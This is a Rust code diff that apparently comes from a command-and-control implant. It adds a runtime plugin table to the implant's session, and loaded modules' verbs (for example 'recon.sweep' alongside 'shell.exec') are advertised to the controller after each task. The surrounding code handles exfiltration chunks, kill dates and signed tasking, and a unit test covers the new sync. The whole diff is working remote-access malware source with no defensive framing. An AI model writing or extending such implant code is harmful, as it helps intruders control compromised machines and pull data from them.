@@ -4,6 +4,7 @@ use crate::channel::{self, Channels};
 use crate::envelope;
 use crate::handlers::{self, Cadence};
 use crate::outbox::Outbox;
+use crate::plugins::Plugins;
 use crate::trust::Certificate;
 use crate::verify::{self, NonceTracker, Verdict};
 use crate::wire::{
@@ -21,6 +22,7 @@ pub struct Session {
     pub implant_id: String,
     advertised: Vec<String>,
     pub cadence: Cadence,
+    pub plugins: Plugins,
     pub seal: Option<Seal>,
     signer_pool: Vec<Certificate>,
     pub kill_date: Option<String>,
@@ -90,6 +92,7 @@ impl Session {
             implant_id,
             advertised,
             cadence,
+            plugins: Plugins::new(),
             seal,
             signer_pool,
             kill_date,
@@ -106,6 +109,16 @@ impl Session {
     pub fn advertise(&mut self, capability: &str) {
         if !self.advertised.iter().any(|held| held == capability) {
             self.advertised.push(capability.to_string());
+        }
+    }
+
+    /// Widens the advertisement with the verbs the loaded modules
+    /// registered (architecture.md Sec 5.4): the module table's routes are
+    /// runtime-compiled handlers, so they advertise the same way the baked
+    /// set does and report at the next contact. Idempotent per verb.
+    pub fn sync_module_advertisements(&mut self) {
+        for verb in self.plugins.advertised_verbs() {
+            self.advertise(&verb);
         }
     }
 
@@ -240,8 +253,11 @@ impl Session {
                     return;
                 }
                 // Dispatch runs exactly once: the result and its out-of-band
-                // chunks both come off this one execution.
-                let handler = handlers::dispatch(&task.verb, &task.arguments, &self.cadence);
+                // chunks both come off this one execution. A module.load
+                // that succeeded widened the plugin table's routes, so the
+                // advertisement syncs right behind it.
+                let handler =
+                    handlers::dispatch(&task.verb, &task.arguments, &self.cadence, &self.plugins);
                 self.outbox
                     .result(&task.task_id, handler.outcome, &handler.output);
                 for mut chunk in handler.chunks {
@@ -251,6 +267,7 @@ impl Session {
                         kind: FrameKind::ExfilChunk as i32,
                     });
                 }
+                self.sync_module_advertisements();
             }
             rejected => {
                 let cause = match rejected {
@@ -422,6 +439,40 @@ mod tests {
         session.advertise("cap.x");
         let advertised = advertised_of(&mut session);
         assert_eq!(advertised.iter().filter(|cap| *cap == "cap.x").count(), 1);
+    }
+
+    #[test]
+    fn module_verbs_join_the_advertisement_at_load() {
+        // The widening rule (architecture.md Sec 5.4): a loaded module's
+        // routes are runtime-compiled handlers, so they advertise like the
+        // baked set and report at the next contact. The sync is idempotent
+        // and drops nothing already advertised.
+        let mut session = Session::new(
+            "i".into(),
+            &["shell.exec".to_string()],
+            cadence(),
+            Vec::new(),
+            None,
+            None,
+            true,
+        );
+        session
+            .plugins
+            .install(crate::plugins::ModuleEntry::new_for_test(
+                "sweep",
+                &["recon.sweep"],
+            ));
+        session.sync_module_advertisements();
+        let advertised = advertised_of(&mut session);
+        assert!(advertised.contains(&"shell.exec".to_string()));
+        assert!(advertised.contains(&"recon.sweep".to_string()));
+        // Idempotent: the second sync adds nothing.
+        session.sync_module_advertisements();
+        let again = advertised_of(&mut session);
+        assert_eq!(
+            again.iter().filter(|verb| *verb == "recon.sweep").count(),
+            1
+        );
     }
 
     #[test]
